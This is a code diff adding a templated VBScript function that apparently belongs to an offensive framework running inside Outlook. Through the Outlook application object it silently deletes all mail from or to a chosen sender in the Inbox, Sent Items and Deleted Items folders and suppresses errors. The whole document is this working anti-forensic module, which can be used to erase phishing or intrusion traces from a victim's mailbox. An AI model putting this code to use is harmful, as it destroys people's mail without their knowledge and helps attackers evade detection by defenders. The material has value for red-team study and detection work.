@@ -1,0 +1,52 @@
+Function delete_mail()
+	on error resume next
+	deleteperm = {{ delete_permanent }}
+	deletesent = {{ delete_sent_items }}
+	PropName = "http://schemas.microsoft.com/mapi/proptag/0x39FE001E"
+
+	Set folder = (window.external.OutlookApplication.GetNameSpace("MAPI")).GetDefaultFolder(6)
+	Set mails = folder.Items
+	For Each objMail in mails
+		if LCase(objMail.SenderEmailAddress) = LCase({{ sender }}) then
+			delete_mail = delete_mail & "Inbox - Deleted mail from: " & objMail.SenderEmailAddress & " sent to: " & objMail.To & vbCrLf
+			objMail.Delete
+		end if
+	Next
+
+	if deletesent then
+		Set folder = (window.external.OutlookApplication.GetNameSpace("MAPI")).GetDefaultFolder(5)
+		Set mails = folder.Items
+		For Each objMail in mails
+			Set recips = objMail.Recipients
+			For Each rec In recips
+				Set oPA = rec.PropertyAccessor
+				if LCase(oPA.GetProperty(PropName)) = LCase({{ sender }}) then
+					delete_mail = delete_mail & "Sent items - Deleted mail from: " & objMail.SenderEmailAddress & " sent to: " & LCase(oPA.GetProperty(PropName)) & vbCrLf
+					objMail.Delete
+			    end if
+			Next	
+		Next
+	end if
+
+	if deleteperm then
+		Set folder = (window.external.OutlookApplication.GetNameSpace("MAPI")).GetDefaultFolder(3)
+		Set mails = folder.Items
+		For Each objMail in mails
+			Set recips = objMail.Recipients
+			For Each rec In recips
+				Set oPA = rec.PropertyAccessor
+				if LCase(oPA.GetProperty(PropName)) = LCase({{ sender }}) then
+					delete_mail = delete_mail & "Deleted items - Deleted mail from: " & objMail.SenderEmailAddress & " sent to: " & LCase(oPA.GetProperty(PropName)) & vbCrLf
+					objMail.Delete
+				end if
+			Next	
+			if LCase(objMail.SenderEmailAddress) = LCase({{ sender }}) then
+				delete_mail = delete_mail & "Deleted items - Deleted mail from: " & objMail.SenderEmailAddress & " sent to: " & objMail.To & vbCrLf
+				objMail.Delete
+			end if
+		Next
+	end if
+	if delete_mail = "" then
+		delete_mail = "No emails found from/to: " & {{ sender }}
+	end if
+End Function
